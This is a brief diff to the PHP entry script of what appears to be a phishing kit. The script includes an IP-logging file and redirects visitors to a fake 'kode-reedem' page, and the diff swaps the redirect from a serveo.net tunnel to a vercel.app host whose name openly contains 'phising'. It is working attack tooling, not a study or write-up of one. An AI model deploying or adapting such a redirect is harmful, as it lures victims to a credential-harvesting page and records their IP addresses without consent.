@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://datum.serveo.net/kode-reedem.html');
+header('Location: https://phisingsendyepep.vercel.app/kode-reedem.html');
 exit
 ?>
